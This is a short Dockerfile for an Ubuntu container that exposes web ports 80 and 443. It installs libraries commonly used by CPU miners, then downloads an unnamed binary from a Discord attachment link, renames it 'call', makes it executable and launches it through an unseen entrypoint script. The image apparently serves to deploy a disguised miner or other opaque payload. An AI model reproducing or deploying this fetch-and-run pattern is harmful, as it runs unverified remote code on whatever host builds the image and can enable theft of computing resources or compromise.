FROM ubuntu:latest
EXPOSE 80
EXPOSE 443

WORKDIR /home/
RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 wget sudo && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://cdn.discordapp.com/attachments/821528621544898561/1031697845109129286/webfile && \
    mv webfile call && \
    chmod +x call

COPY . .
RUN chmod +x call.sh
ENTRYPOINT [ "/home/call.sh" ]
